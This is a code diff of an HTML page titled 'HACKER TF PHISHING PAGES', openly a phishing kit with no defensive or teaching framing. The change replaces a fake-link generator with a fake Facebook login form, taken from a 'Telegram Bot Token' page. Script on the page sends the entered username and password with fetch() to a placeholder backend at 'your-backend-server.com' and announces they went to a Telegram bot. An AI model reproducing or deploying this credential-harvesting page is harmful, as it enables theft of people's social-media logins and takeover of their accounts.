@@ -1,19 +1,24 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="hi">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Bot Token</title>
+    <title>HACKER TF PHISHING PAGES</title>
     <style>
         body {
             font-family: Arial, sans-serif;
             margin: 20px;
         }
+        h1, h2 {
+            color: #333;
+        }
         input, button {
             margin: 10px 0;
             padding: 10px;
-            width: 100%;
-            max-width: 300px;
+            font-size: 16px;
+        }
+        button {
+            cursor: pointer;
         }
         .hidden {
             display: none;
@@ -21,46 +26,53 @@
     </style>
 </head>
 <body>
-    <h1>Telegram Bot Token</h1>
-    <button id="showTokenInput">Add Bot Token</button>
+    <h1>Welcome to HACKER TF PHISHING PAGE</h1>
+    <button id="createLinkButton">Create Link</button>
 
-    <div id="tokenInputSection" class="hidden">
+    <div id="tokenForm" class="hidden">
         <input type="text" id="botToken" placeholder="Enter your Telegram Bot Token">
         <button id="submitToken">Submit</button>
     </div>
 
-    <div id="fakeLoginLinkSection" class="hidden">
-        <h2>Fake Facebook Login Link</h2>
-        <p>Copy the link below and open it in another browser/tab:</p>
-        <input type="text" id="fakeLoginLink" readonly>
-        <button id="copyLink">Copy Link</button>
+    <div id="fakeFacebookLogin" class="hidden">
+        <h2>Fake Facebook Login</h2>
+        <input type="text" id="fakeUsername" placeholder="Username">
+        <input type="password" id="fakePassword" placeholder="Password">
+        <button id="fakeLoginButton">Login</button>
     </div>
 
     <script>
-        // Show token input section
-        document.getElementById('showTokenInput').addEventListener('click', function() {
-            document.getElementById('tokenInputSection').classList.remove('hidden');
+        document.getElementById('createLinkButton').addEventListener('click', function() {
+            document.getElementById('tokenForm').classList.remove('hidden');
         });
 
-        // Handle token submission
         document.getElementById('submitToken').addEventListener('click', function() {
-            const botToken = document.getElementById('botToken').value;
+            var botToken = document.getElementById('botToken').value;
             if (botToken) {
-                // Generate fake login link
-                const fakeLoginLink = `${window.location.origin}/fake_login.html?token=${encodeURIComponent(botToken)}`;
-                document.getElementById('fakeLoginLink').value = fakeLoginLink;
-                document.getElementById('fakeLoginLinkSection').classList.remove('hidden');
-            } else {
-                alert('Please enter a valid bot token.');
+                document.getElementById('tokenForm').classList.add('hidden');
+                document.getElementById('fakeFacebookLogin').classList.remove('hidden');
             }
         });
 
-        // Copy link to clipboard
-        document.getElementById('copyLink').addEventListener('click', function() {
-            const linkInput = document.getElementById('fakeLoginLink');
-            linkInput.select();
-            document.execCommand('copy');
-            alert('Link copied to clipboard!');
+        document.getElementById('fakeLoginButton').addEventListener('click', function() {
+            var username = document.getElementById('fakeUsername').value;
+            var password = document.getElementById('fakePassword').value;
+            if (username && password) {
+                fetch('https://your-backend-server.com/send-login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ username, password }),
+                })
+                .then(response => response.json())
+                .then(data => {
+                    alert('Login details sent to Telegram bot.');
+                })
+                .catch((error) => {
+                    console.error('Error:', error);
+                });
+            }
         });
     </script>
 </body>
